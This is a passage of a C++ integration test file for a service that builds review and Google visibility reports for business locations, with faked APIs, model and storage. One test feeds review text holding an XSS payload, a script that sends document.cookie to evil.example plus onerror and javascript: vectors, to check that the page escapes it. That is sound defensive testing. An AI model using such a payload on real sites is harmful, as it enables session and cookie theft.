// A location's reports end to end (FR-8, D-085, D-102, D-104), through the router and the jobs
// as the engine assembles them, with a fake Performance API, a scripted
// model, a bucket held in memory and a channel that keeps what it is given.
// Nothing leaves the test: no Google, no model, no bucket, no email.
//
// A report's page is one object in the public bucket under a random name,
// named on the row by the build right before its upload; the engine serves
// no report's page to anyone, signed in or not.

#include "api_fixture.hpp"
#include "db/repo_reports.hpp"
#include "jobs/notifications.hpp"
#include "jobs/reports.hpp"

#include <gmock/gmock.h>

#include <regex>

using namespace poni;
using namespace std::chrono_literals;
using test::FakeLlm;
using testing::HasSubstr;
using testing::Not;

namespace {

constexpr std::string_view kPublicBase = "https://storage.test/public/";

class Reports : public test::ApiTest {
protected:
    void SetUp() override {
        ApiTest::SetUp();
        add_spa_and_buffet();
        gbp_.add_location("9003", "LU DREAM SPA - Upper East Side");
        discover();
        spa_client_ = make_client("LU DREAM SPA");
        buffet_client_ = make_client("Gangnam AYCE Buffet");
        chelsea_ = link("9001", spa_client_);
        uptown_ = link("9003", spa_client_);
        buffet_ = link("9002", buffet_client_);
        become_test_clients();
        exec("UPDATE locations SET time_zone = 'America/New_York'");

        start();
        notifier_.emplace(db(), clock_, jobs::NotifierOptions{.public_url = "http://localhost:5173"});
        notifier_->add_channel(channel_);
        jobs::install(registry_, *notifier_);
    }

    void TearDown() override {
        notifier_.reset();
        reporter_.reset();
        ApiTest::TearDown();
    }

    // (Re)starts the report service and the API, with or without the public bucket.
    void start(bool with_bucket = true) {
        reporter_.emplace(db(), clock_, performance_, llm_, with_bucket ? &public_ : nullptr);
        api_reporter_ = &*reporter_;
        api_options_.llm_providers = {"anthropic", "dashscope"};
        build({});
        browser_ = sign_in();
        if (!jobs_registered_) {
            jobs_registered_ = true;
            // The handlers ask reporter_ each time, so a restarted service is the one they use.
            registry_.add(std::string(repo::kBuildReportKind), [this](const jobs::Job& job) -> boost::asio::awaitable<void> {
                co_await reporter_->build(job.payload.at("report_id").to_number<std::int64_t>(), job.attempts >= job.max_attempts);
            });
        }
    }



    // A review in the mirror, written at `created` (RFC 3339). Returns its id.
    std::int64_t add_review(std::int64_t location, const std::string& gid, int stars, const std::string& created, const std::string& text = "",
                            std::optional<std::string> replied_at = std::nullopt, const std::string& name = "A Reviewer",
                            std::optional<std::string> photo = std::nullopt) {
        pqxx::work tx{conn()};
        const auto id = tx.query_value<std::int64_t>(
            "INSERT INTO reviews (location_id, gbp_review_id, gbp_name, rating, comment, original_text, reviewer_name, "
            "reviewer_photo_url, created_time, updated_time, reply_text, reply_updated_time, reply_origin, raw, first_seen_at, "
            "last_seen_at, last_changed_at) VALUES ($1, $2, 'accounts/111/locations/x/reviews/' || $2, $3, nullif($4, ''), "
            "nullif($4, ''), $5, $6, $7::timestamptz, $7::timestamptz, CASE WHEN $8::text IS NULL THEN NULL ELSE 'Thank you!' END, "
            "$8::timestamptz, CASE WHEN $8::text IS NULL THEN NULL ELSE 'external' END, '{}', now(), now(), now()) RETURNING id",
            pqxx::params{location, gid, stars, text, name, photo, created, replied_at});
        tx.commit();
        return id;
    }

    // The review's analysis, as the pipeline would have stored it.
    void analyze(std::int64_t review, const std::string& sentiment, const std::string& topics = "[]", const std::string& items = "[]") {
        pqxx::work tx{conn()};
        tx.exec("INSERT INTO review_analyses (review_id, review_updated_time, status, language, script, sentiment, contains_complaint, "
                "topics, items, manipulation_suspected, industry_key, prompt_version, created_at) "
                "VALUES ($1, now(), 'ok', 'en', 'Latn', $2, false, $3::jsonb, $4::jsonb, false, 'wellness', 'test', now())",
                pqxx::params{review, sentiment, topics, items});
        tx.commit();
    }

    // "Generate now" for October 2026 (or another period), with its job run. Returns the report's id.
    std::int64_t generate(std::int64_t location, const std::string& from = "2026-10-01", const std::string& to = "2026-10-31") {
        const auto response = post(std::format("/api/locations/{}/reports", location),
                                   std::format(R"({{"period_start": "{}", "period_end": "{}"}})", from, to));
        EXPECT_EQ(response.status, 201u) << response.body;
        if (response.status != 201) return 0;
        const auto id = json(response).at("id").as_int64();
        run_jobs();
        return id;
    }

    boost::json::value report(std::int64_t id) { return read(std::format("/api/reports/{}", id)); }
    std::string status(std::int64_t id) { return std::string(report(id).at("status").as_string()); }
    boost::json::value data(std::int64_t id) {
        return boost::json::parse(value<std::string>(std::format("SELECT data::text FROM reports WHERE id = {}", id)));
    }
    // The name of the report's page, as the row holds it ("" while it has none).
    std::string page_object(std::int64_t id) {
        return value<std::string>(std::format("SELECT coalesce(page_object, '') FROM reports WHERE id = {}", id));
    }
    // The page, as the build put it into the bucket.
    std::string html(std::int64_t id) { return public_.objects.at(page_object(id)).body; }

    void recipients(std::int64_t location, const std::string& list) {
        const auto response = post("/api/notification-rules",
                                   std::format(R"({{"event_type": "location_report", "location_id": {}, "recipients": {}}})", location, list));
        ASSERT_EQ(response.status, 201u) << response.body;
    }
    // What a person does on the settings page; in this test's throwaway database.
    void sending_on() { exec("UPDATE system_settings SET email_sending_enabled = true"); }

    std::int64_t schedule(std::int64_t location, const std::string& rest) {
        const auto response = post("/api/report-schedules", std::format(R"({{"location_id": {}, {}}})", location, rest));
        EXPECT_EQ(response.status, 201u) << response.body;
        return response.status == 201 ? json(response).at("id").as_int64() : 0;
    }
    // A schedule as the dashboard reads it, from the list; null once it is gone.
    boost::json::value listed_schedule(std::int64_t id) {
        for (const auto& item : read("/api/report-schedules").at("items").as_array()) {
            if (item.at("id").as_int64() == id) return item;
        }
        return nullptr;
    }

    FakeLlm llm_;
    test::FakePerformance performance_;
    test::FakeStore public_{std::string(kPublicBase)};
    test::FakeChannel channel_;
    std::optional<jobs::Reporter> reporter_;
    std::optional<jobs::Notifier> notifier_;
    bool jobs_registered_ = false;
    std::int64_t chelsea_ = 0, uptown_ = 0;
};

}  // namespace

// ---- building ------------------------------------------------------------------------

TEST_F(Reports, AReportCountsTheReviewsOfItsLocationAndPeriodInTheLocationsTimeZone) {
    // October 2026 in New York. The edges: 03:30 UTC is 23:30 the evening before.
    const auto praised = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely head spa", "2026-10-05T17:00:00Z");
    add_review(chelsea_, "a2", 4, "2026-10-06T15:00:00Z", "Good");
    const auto complaint = add_review(chelsea_, "b1", 1, "2026-10-07T15:00:00Z", "The room was cold and nobody cared");
    add_review(chelsea_, "edge-in", 5, "2026-11-01T03:30:00Z", "Still October here");
    add_review(chelsea_, "edge-out", 2, "2026-10-01T03:30:00Z", "Still September here");
    add_review(chelsea_, "sep", 3, "2026-09-15T15:00:00Z", "September");
    add_review(chelsea_, "nov", 1, "2026-11-05T15:00:00Z", "November");
    // The client's other location is not this location's report (D-102).
    add_review(uptown_, "other-location", 1, "2026-10-10T15:00:00Z", "Another location's review");
    const auto elsewhere = add_review(uptown_, "other-case", 1, "2026-10-11T15:00:00Z", "Cold at the other one");
    exec(std::format("INSERT INTO cases (review_id, opened_by, opened_at, updated_at) "
                     "VALUES ({}, 'severity_flag', '2026-10-11T16:00:00Z', '2026-10-11T16:00:00Z')",
                     elsewhere));
    const auto removed = add_review(chelsea_, "gone", 1, "2026-10-08T15:00:00Z", "Removed by Google");
    exec(std::format("UPDATE reviews SET removed_at = now() WHERE id = {}", removed));
    analyze(praised, "positive", R"([{"id": "treatment_quality", "polarity": "positive"}])",
            R"([{"name": "Head spa", "type": "treatment", "polarity": "positive"}])");
    analyze(complaint, "negative", R"([{"id": "ambience", "polarity": "negative"}])");
    exec(std::format("INSERT INTO cases (review_id, opened_by, opened_at, updated_at) "
                     "VALUES ({}, 'severity_flag', '2026-10-07T16:00:00Z', '2026-10-07T16:00:00Z')",
                     complaint));

    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "ready");
    const auto d = data(id);
    EXPECT_EQ(d.at("location_id").as_int64(), chelsea_);
    EXPECT_EQ(d.at("location_title").as_string(), "LU DREAM SPA - Chelsea");
    EXPECT_EQ(d.at("time_zone").as_string(), "America/New_York");
    EXPECT_EQ(d.at("previous_start").as_string(), "2026-09-01");
    const auto& now = d.at("reviews");
    EXPECT_EQ(now.at("new_reviews").as_int64(), 4);
    EXPECT_DOUBLE_EQ(now.at("average_rating").to_number<double>(), 3.75);
    EXPECT_EQ(boost::json::serialize(now.at("stars")), "[1,0,0,1,2]");
    EXPECT_EQ(now.at("replied").as_int64(), 1);
    EXPECT_DOUBLE_EQ(now.at("response_rate").to_number<double>(), 0.25);
    EXPECT_DOUBLE_EQ(now.at("median_response_hours").to_number<double>(), 2.0);
    EXPECT_EQ(now.at("positive").as_int64(), 1);
    EXPECT_EQ(now.at("negative").as_int64(), 1);
    EXPECT_EQ(d.at("previous").at("new_reviews").as_int64(), 2);  // the September one and the edge
    EXPECT_DOUBLE_EQ(d.at("previous").at("average_rating").to_number<double>(), 2.5);
    // The overall rating: every review of the location up to the end of October that was not removed.
    EXPECT_EQ(d.at("running_count").as_int64(), 6);
    EXPECT_EQ(d.at("topics_praised").at(0).at("label").as_string(), "Treatment quality and technique");
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Head spa");
    EXPECT_EQ(d.at("topics_complained").at(0).at("count").as_int64(), 1);
    EXPECT_EQ(d.at("escalations_opened").as_int64(), 1);
    EXPECT_EQ(d.at("escalations_closed").as_int64(), 0);
    EXPECT_EQ(d.at("highlights_worst").at(0).at("text").as_string(), "The room was cold and nobody cared");

    const auto page = html(id);
    EXPECT_THAT(page, HasSubstr("October 1 to 31, 2026"));
    EXPECT_THAT(page, HasSubstr("Lovely head spa"));
    EXPECT_THAT(page, HasSubstr("A Reviewer"));
    EXPECT_THAT(page, HasSubstr("<h1>LU DREAM SPA - Chelsea</h1>"));
    EXPECT_THAT(page, Not(HasSubstr("Another location&#39;s review")));
    EXPECT_THAT(page, Not(HasSubstr("Removed by Google")));

    // The API's view of it, and the audit entry in the person's name.
    const auto listed = read(std::format("/api/reports?location_id={}", chelsea_));
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    EXPECT_EQ(read(std::format("/api/reports?location_id={}", uptown_)).at("total").as_int64(), 0);
    EXPECT_EQ(listed.at("items").at(0).at("location_id").as_int64(), chelsea_);
    EXPECT_EQ(listed.at("items").at(0).at("location_title").as_string(), "LU DREAM SPA - Chelsea");
    EXPECT_EQ(listed.at("items").at(0).at("new_reviews").as_int64(), 4);
    // The two headline figures are the ones the built report holds, read from its data, in the list and when one is read.
    EXPECT_DOUBLE_EQ(listed.at("items").at(0).at("average_rating").to_number<double>(), 3.75);
    EXPECT_DOUBLE_EQ(listed.at("items").at(0).at("response_rate").to_number<double>(), 0.25);
    EXPECT_DOUBLE_EQ(report(id).at("average_rating").to_number<double>(), 3.75);
    EXPECT_DOUBLE_EQ(report(id).at("response_rate").to_number<double>(), 0.25);
    EXPECT_EQ(listed.at("items").at(0).at("requested_by").as_string(), "staff@xvisionmediaus.com");
    EXPECT_EQ(count("audit_log WHERE action = 'report.create' AND actor = 'staff@xvisionmediaus.com'"), 1);
}

// Which item types are people is read from the seeded profile (D-086): the
// wellness profile's "therapist" is one, its "treatment" is not.
TEST_F(Reports, NamedStaffAreListedApartFromTheItems) {
    const auto a = add_review(chelsea_, "s1", 5, "2026-10-05T15:00:00Z", "Anna was wonderful");
    const auto b = add_review(chelsea_, "s2", 5, "2026-10-06T15:00:00Z", "anna and the head spa");
    const auto c = add_review(chelsea_, "s3", 2, "2026-10-07T15:00:00Z", "Bo was rough");
    add_review(chelsea_, "s4", 4, "2026-10-08T15:00:00Z", "Nice");
    // Someone at the client's other location is that location's.
    const auto elsewhere = add_review(uptown_, "s5", 5, "2026-10-09T15:00:00Z", "Cara was great");
    analyze(a, "positive", "[]", R"([{"name": "Anna", "type": "therapist", "polarity": "positive"}])");
    analyze(b, "positive", "[]",
            R"([{"name": "anna", "type": "therapist", "polarity": "positive"}, {"name": "Head spa", "type": "treatment", "polarity": "positive"}])");
    analyze(c, "negative", "[]", R"([{"name": "Bo", "type": "therapist", "polarity": "negative"}])");
    analyze(elsewhere, "positive", "[]", R"([{"name": "Cara", "type": "therapist", "polarity": "positive"}])");

    const auto id = generate(chelsea_);
    const auto d = data(id);
    EXPECT_EQ(d.at("version").as_int64(), 3);
    // The therapists are not items; the treatment is.
    ASSERT_EQ(d.at("items_praised").as_array().size(), 1u);
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Head spa");
    EXPECT_TRUE(d.at("items_complained").as_array().empty());
    const auto& staff = d.at("staff");
    EXPECT_EQ(staff.at("reviews_naming").as_int64(), 3);
    // Anna and anna are one person, under the name as first written.
    ASSERT_EQ(staff.at("recognized").as_array().size(), 1u);
    EXPECT_EQ(staff.at("recognized").at(0).at("name").as_string(), "Anna");
    EXPECT_EQ(staff.at("recognized").at(0).at("positive").as_int64(), 2);
    EXPECT_EQ(staff.at("recognized").at(0).at("rank").as_int64(), 1);
    ASSERT_EQ(staff.at("complained").as_array().size(), 1u);
    EXPECT_EQ(staff.at("complained").at(0).at("name").as_string(), "Bo");
    EXPECT_EQ(staff.at("complained").at(0).at("negative").as_int64(), 1);

    const auto page = html(id);
    EXPECT_THAT(page, HasSubstr("<h2>Employee recognition</h2>"));
    EXPECT_THAT(page, Not(HasSubstr("Cara")));
    EXPECT_THAT(page, HasSubstr("Based on 3 reviews that named a staff member"));
}

// An industry whose profile has no person type gives no section; a report
// stored in an older shape is still read as it was (D-085).
TEST_F(Reports, AnIndustryWithoutPeopleHasNoSectionAndAnOldReportIsReadAsItWas) {
    reseed("UPDATE kb_industries SET item_types = (SELECT jsonb_agg(t - 'person') FROM jsonb_array_elements(item_types) t)");
    const auto r = add_review(chelsea_, "s1", 5, "2026-10-05T15:00:00Z", "Anna was wonderful");
    analyze(r, "positive", "[]", R"([{"name": "Anna", "type": "therapist", "polarity": "positive"}])");
    const auto id = generate(chelsea_);
    const auto d = data(id);
    EXPECT_FALSE(d.as_object().contains("staff") && !d.at("staff").is_null());
    EXPECT_EQ(d.at("items_praised").at(0).at("label").as_string(), "Anna");
    EXPECT_THAT(html(id), Not(HasSubstr("Employee recognition")));

    // What version 2 stored, before D-102: a list of locations, and a location on each highlight and staff row.
    ASSERT_EQ(d.at("highlights_best").as_array().size(), 1u);
    exec(std::format("UPDATE reports SET data = jsonb_set(data, '{{highlights_best,0,location_title}}', '\"LU DREAM SPA - Chelsea\"') || "
                     "'{{\"version\": 2, \"locations\": [], \"staff\": {{\"reviews_naming\": 1, \"recognized\": [{{\"rank\": 1, "
                     "\"location_id\": {}, \"location_title\": \"LU DREAM SPA - Chelsea\", \"name\": \"Anna\", \"positive\": 1, "
                     "\"negative\": 0}}], \"complained\": []}}}}' WHERE id = {}",
                     chelsea_, id));
    EXPECT_TRUE(data(id).at("highlights_best").at(0).as_object().contains("location_title"));
    const auto response = get(std::format("/api/reports/{}", id), browser_);
    ASSERT_EQ(response.status, 200u) << response.body;
    EXPECT_EQ(json(response).at("new_reviews").as_int64(), 1);
}

TEST_F(Reports, ALocationWithoutAnyReviewGetsAReportThatSaysSo) {
    const auto id = generate(buffet_);
    EXPECT_EQ(status(id), "ready");
    const auto d = data(id);
    EXPECT_EQ(d.at("reviews").at("new_reviews").as_int64(), 0);
    EXPECT_TRUE(d.at("reviews").at("average_rating").is_null());
    // A period without reviews has a count and no figures: null, not zero.
    EXPECT_EQ(report(id).at("new_reviews").as_int64(), 0);
    EXPECT_TRUE(report(id).at("average_rating").is_null());
    EXPECT_TRUE(report(id).at("response_rate").is_null());
    EXPECT_TRUE(d.at("running_average").is_null());
    EXPECT_FALSE(d.at("visibility").at("available").as_bool());
    EXPECT_THAT(html(id), HasSubstr("No new reviews in this period."));
    // Nothing to summarize, so the model was not asked.
    EXPECT_EQ(llm_.calls("summary"), 0u);
    EXPECT_TRUE(report(id).at("summary").is_null());
}

TEST_F(Reports, AReportStillBuildingHasNoFigures) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely head spa", "2026-10-05T17:00:00Z");
    const auto response = post(std::format("/api/locations/{}/reports", chelsea_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u) << response.body;
    const auto made = json(response);
    EXPECT_EQ(made.at("status").as_string(), "building");
    for (const auto* member : {"new_reviews", "average_rating", "response_rate", "summary"}) {
        EXPECT_TRUE(made.at(member).is_null()) << member;
    }
    run_jobs();
    EXPECT_EQ(report(made.at("id").as_int64()).at("new_reviews").as_int64(), 1);
    EXPECT_DOUBLE_EQ(report(made.at("id").as_int64()).at("average_rating").to_number<double>(), 5.0);
    EXPECT_DOUBLE_EQ(report(made.at("id").as_int64()).at("response_rate").to_number<double>(), 1.0);
}

TEST_F(Reports, VisibilityComesFromGoogleWhenTheReportIsBuilt) {
    using namespace std::chrono;
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    for (unsigned d = 1; d <= 31; ++d) {
        performance_.set("9001", "BUSINESS_IMPRESSIONS_MOBILE_MAPS", 2026y / October / d, 100);
        performance_.set("9001", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / October / d, 10);
    }
    for (unsigned d = 1; d <= 30; ++d) performance_.set("9001", "BUSINESS_IMPRESSIONS_MOBILE_MAPS", 2026y / September / d, 50);
    performance_.set("9001", "CALL_CLICKS", 2026y / October / 12, 9);
    performance_.keywords["9001"]["2026-10"] = {{"head spa nyc", 400, {}}, {"spa near me", {}, 15}};
    // The numbers of the client's other location are not this report's.
    performance_.set("9003", "CALL_CLICKS", 2026y / October / 12, 1000);
    performance_.keywords["9003"]["2026-10"] = {{"head spa nyc", 100, {}}};

    const auto id = generate(chelsea_);
    const auto v = data(id).at("visibility");
    EXPECT_TRUE(v.at("available").as_bool());
    EXPECT_TRUE(v.at("complete").as_bool());
    EXPECT_EQ(v.at("as_of").as_string(), "2026-10-31");
    EXPECT_EQ(v.at("totals").at("maps_mobile").as_int64(), 3100);
    EXPECT_EQ(v.at("totals").at("search_mobile").as_int64(), 310);
    EXPECT_EQ(v.at("totals").at("calls").as_int64(), 9);
    EXPECT_EQ(v.at("previous").at("maps_mobile").as_int64(), 1500);
    EXPECT_EQ(data(id).at("keywords").at("month").as_string(), "2026-10");
    EXPECT_EQ(data(id).at("keywords").at("items").at(0).at("impressions").as_int64(), 400);
    EXPECT_EQ(performance_.daily_calls, 1);  // one read of the location, covering both periods
    EXPECT_THAT(html(id), HasSubstr("head spa nyc"));
    EXPECT_THAT(html(id), HasSubstr("fewer than 15"));
}

TEST_F(Reports, GooglesLagIsShownAsTheDayTheNumbersGoUpTo) {
    using namespace std::chrono;
    // A weekly report made on Monday November 9 for November 2 to 8; Google has data up to the 5th.
    for (unsigned d = 26; d <= 31; ++d) {
        performance_.set("9002", "WEBSITE_CLICKS", 2026y / October / d, 7);
        performance_.set("9002", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / October / d, 100);
    }
    for (unsigned d = 1; d <= 5; ++d) {
        performance_.set("9002", "WEBSITE_CLICKS", 2026y / November / d, 7);
        performance_.set("9002", "BUSINESS_IMPRESSIONS_MOBILE_SEARCH", 2026y / November / d, 100);
    }
    // No keywords for November yet: October's are shown, and say so.
    performance_.keywords["9002"]["2026-10"] = {{"buffet near me", 3000, {}}};

    const auto id = generate(buffet_, "2026-11-02", "2026-11-08");
    const auto d = data(id);
    EXPECT_EQ(d.at("visibility").at("as_of").as_string(), "2026-11-05");
    EXPECT_FALSE(d.at("visibility").at("complete").as_bool());
    EXPECT_EQ(d.at("visibility").at("totals").at("website_clicks").as_int64(), 28);
    EXPECT_TRUE(d.at("visibility").at("previous").is_null());
    EXPECT_EQ(d.at("keywords").at("month").as_string(), "2026-10");
    EXPECT_THAT(html(id), HasSubstr("they go up to November 5, 2026"));
    EXPECT_THAT(html(id), HasSubstr("What people searched for, October 2026"));
}

TEST_F(Reports, AnOutageAtGoogleIsRetriedAndThenTheReportIsBuiltWithoutVisibility) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    for (int i = 0; i < repo::kBuildReportAttempts; ++i) {
        performance_.failures.push_back({google::ApiError::Kind::unavailable, 503, "backend error"});
    }
    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "building");
    for (int attempt = 1; attempt < repo::kBuildReportAttempts; ++attempt) {
        clock_.advance(2h);
        run_jobs();
    }
    EXPECT_EQ(status(id), "ready");
    const auto v = data(id).at("visibility");
    // The location's read failed for good.
    EXPECT_FALSE(v.at("available").as_bool());
    EXPECT_EQ(v.at("detail").as_string(), "backend error");
    // Google's error text stays off the page a client reads.
    EXPECT_THAT(html(id), Not(HasSubstr("backend error")));
    EXPECT_THAT(html(id), HasSubstr("Google could not be asked for the visibility numbers"));
    EXPECT_EQ(data(id).at("reviews").at("new_reviews").as_int64(), 1);
}

TEST_F(Reports, AnAccountThatIsNotConnectedDoesNotStopAReportAndIsNotRetried) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    performance_.failures.push_back({google::ApiError::Kind::not_configured, 0, "no GBP account is connected"});
    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "ready");
    EXPECT_THAT(html(id), Not(HasSubstr("no GBP account is connected")));
    EXPECT_EQ(data(id).at("visibility").at("detail").as_string(), "no GBP account is connected");
    EXPECT_EQ(performance_.daily_calls, 1);
}

TEST_F(Reports, AJobThatKeepsFailingMarksTheReportFailed) {
    // A zone the system does not know any more: the job cannot work out the period.
    const auto response = post(std::format("/api/locations/{}/reports", chelsea_),
                               R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u);
    const auto id = json(response).at("id").as_int64();
    exec(std::format("UPDATE reports SET time_zone = 'Nowhere/Land' WHERE id = {}", id));
    for (int attempt = 0; attempt < repo::kBuildReportAttempts; ++attempt) {
        run_jobs();
        clock_.advance(2h);
    }
    const auto failed = report(id);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_THAT(std::string(failed.at("error").as_string()), HasSubstr("Nowhere/Land"));
    // It failed before its upload: no numbers, no page, and no name for one.
    EXPECT_TRUE(failed.at("url").is_null());
    EXPECT_EQ(count(std::format("reports WHERE id = {} AND data IS NULL AND page_object IS NULL", id)), 1);
    EXPECT_TRUE(public_.objects.empty());
}

// ---- the summary -----------------------------------------------------------------------

TEST_F(Reports, TheSummaryIsWrittenFromTheFiguresWithoutReviewTextOrNames) {
    const auto review = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "SECRET-WORDS-OF-THE-REVIEW", std::nullopt, "SECRET-NAME");
    analyze(review, "positive", R"([{"id": "treatment_quality", "polarity": "positive"}])");
    const auto id = generate(chelsea_);

    ASSERT_EQ(llm_.calls("summary"), 1u);
    const auto& request = llm_.requests.back();
    EXPECT_EQ(request.task, "summary");
    EXPECT_EQ(request.location_id, chelsea_);
    // The business is named by the location's title.
    EXPECT_THAT(request.messages.back().content, HasSubstr("LU DREAM SPA - Chelsea"));
    EXPECT_EQ(request.provider, "dashscope");
    for (const auto& message : request.messages) {
        EXPECT_THAT(message.content, Not(HasSubstr("SECRET-WORDS-OF-THE-REVIEW")));
        EXPECT_THAT(message.content, Not(HasSubstr("SECRET-NAME")));
    }
    EXPECT_THAT(request.messages.back().content, HasSubstr("Treatment quality"));

    EXPECT_THAT(std::string(report(id).at("summary").as_string()), HasSubstr("You had a steady period."));
    EXPECT_THAT(html(id), HasSubstr("class=\"summary\">You had a steady period."));
    // The page shows the review and the name, as on Google.
    EXPECT_THAT(html(id), HasSubstr("SECRET-WORDS-OF-THE-REVIEW"));
    EXPECT_THAT(html(id), HasSubstr("SECRET-NAME"));
}

TEST_F(Reports, ASummaryThatFailsACheckIsLeftOutAndTheReportIsBuiltAnyway) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    llm_.summary = FakeLlm::always(R"({"summary": "A fine month. Book again at www.example.com/deal today."})");
    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "ready");
    EXPECT_TRUE(report(id).at("summary").is_null());
    EXPECT_THAT(std::string(report(id).at("summary_note").as_string()), HasSubstr("no_url"));
    EXPECT_THAT(html(id), Not(HasSubstr("www.example.com")));
}

TEST_F(Reports, AModelThatDoesNotAnswerOrIsSwitchedOffLeavesTheReportWithoutASummary) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    llm_.summary = [](const llm::ChatRequest&) { return FakeLlm::failure(llm::Error::Kind::unavailable); };
    const auto down = generate(chelsea_);
    EXPECT_EQ(status(down), "ready");
    EXPECT_THAT(std::string(report(down).at("summary_note").as_string()), HasSubstr("gave no answer"));

    llm_.requests.clear();
    exec("UPDATE ai_settings SET enabled = false");
    const auto off = generate(chelsea_);
    EXPECT_THAT(std::string(report(off).at("summary_note").as_string()), HasSubstr("switched off"));
    EXPECT_EQ(llm_.calls("summary"), 0u);

    exec("UPDATE ai_settings SET enabled = true");
    llm_.provider_names = {"anthropic"};
    const auto unconfigured = generate(chelsea_);
    EXPECT_THAT(std::string(report(unconfigured).at("summary_note").as_string()), HasSubstr("'dashscope' is not configured"));
}

TEST_F(Reports, TheSummaryTaskHasItsOwnProviderAndModel) {
    auto settings = read("/api/ai/settings");
    EXPECT_EQ(settings.at("summary_provider").as_string(), "dashscope");
    EXPECT_EQ(settings.at("summary_model").as_string(), settings.at("generator_model").as_string());
    const auto changed = patch("/api/ai/settings", R"({"summary_provider": "anthropic", "summary_model": "claude-haiku-5-5"})");
    ASSERT_EQ(changed.status, 200u) << changed.body;
    EXPECT_EQ(patch("/api/ai/settings", R"({"summary_provider": "nobody"})").status, 400u);
    EXPECT_EQ(patch("/api/ai/settings", R"({"summary_model": " "})").status, 400u);
    // The knowledge base has the default that is shown beside the setting.
    EXPECT_EQ(read("/api/knowledge").at("defaults").at("analysis").at("summary_model").as_string(), "qwen3.7-plus");

    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    generate(chelsea_);
    EXPECT_EQ(llm_.requests.back().provider, "anthropic");
    EXPECT_EQ(llm_.requests.back().model, "claude-haiku-5-5");
    // A change to it is no change to what was tested for auto-posting: the writer and the analyzer are as they were.
    EXPECT_EQ(read("/api/ai/settings").at("generator_model").as_string(), settings.at("generator_model").as_string());
}

// ---- the page ---------------------------------------------------------------------------

TEST_F(Reports, HostileReviewTextIsTextOnThePage) {
    const std::string attack = R"(<script>fetch('https://evil.example/'+document.cookie)</script><img src=x onerror=alert(1)>)";
    const auto review = add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Nice. " + attack, std::nullopt, "Mallory " + attack,
                                   "javascript:alert(1)");
    analyze(review, "positive", "[]", std::format(R"([{{"name": {}, "type": "treatment", "polarity": "positive"}}])",
                                                  boost::json::serialize(boost::json::value("Massage " + attack))));
    const auto id = generate(chelsea_);
    const auto page = html(id);
    EXPECT_THAT(page, Not(HasSubstr("<script")));
    EXPECT_THAT(page, Not(HasSubstr("<img")));
    EXPECT_THAT(page, Not(HasSubstr("javascript:")));
    EXPECT_THAT(page, HasSubstr("Nice. &lt;script&gt;fetch("));
    EXPECT_THAT(page, HasSubstr("Mallory &lt;script&gt;"));
    EXPECT_THAT(page, HasSubstr("Massage &lt;script&gt;"));

    // The object is served as HTML and kept in no cache.
    const auto& object = public_.objects.at(page_object(id));
    EXPECT_EQ(object.content_type, "text/html; charset=utf-8");
    EXPECT_EQ(object.cache_control, "no-store");
}

TEST_F(Reports, NothingOfAReportIsServedWithoutASession) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    generate(chelsea_);
    // The routes of reports, from the router's table: the 7 there are (D-104) and every one added since.
    EXPECT_GE(expect_session_and_csrf({"/reports", "/report-schedules"}, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 7u);
    // There is no route for a token at all: the engine does not host reports' pages.
    EXPECT_EQ(get("/r/anything.html").status, 404u);
    // Nor for the page, its share links, sending it the old way or rejecting it, even signed in.
    for (const auto& response : {get("/api/reports/1/html", browser_), post("/api/reports/1/send"), post("/api/reports/1/reject"),
                                 post("/api/reports/1/share-links"), post("/api/report-share-links/1/revoke")}) {
        EXPECT_EQ(response.status, 404u);
        EXPECT_EQ(error_code(response), "not_found");
    }
}

TEST_F(Reports, APeriodMustBeOverAndMakeSense) {
    const auto create = [&](std::int64_t location, const std::string& body) {
        return post(std::format("/api/locations/{}/reports", location), body).status;
    };
    // The clock says 2026-11-10 07:00 in New York: today is not over, yesterday is.
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2026-11-01", "period_end": "2026-11-10"})"), 400u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2026-11-09", "period_end": "2026-11-09"})"), 201u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2026-10-31", "period_end": "2026-10-01"})"), 400u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2025-01-01", "period_end": "2026-10-31"})"), 400u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "October", "period_end": "2026-10-31"})"), 400u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2026-10-01"})"), 400u);
    EXPECT_EQ(create(chelsea_, R"({"period_start": "2026-10-01", "period_end": "2026-10-31", "time_zone": "Mars/Base"})"), 400u);
    EXPECT_EQ(create(999999, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 404u);
    // An archived client changes nothing about its location's reports (D-102).
    exec(std::format("UPDATE clients SET archived = true WHERE id = {}", buffet_client_));
    EXPECT_EQ(create(buffet_, R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"), 201u);
    // A zone of its own: the same day ended hours earlier in Tokyo.
    const auto tokyo = post(std::format("/api/locations/{}/reports", chelsea_),
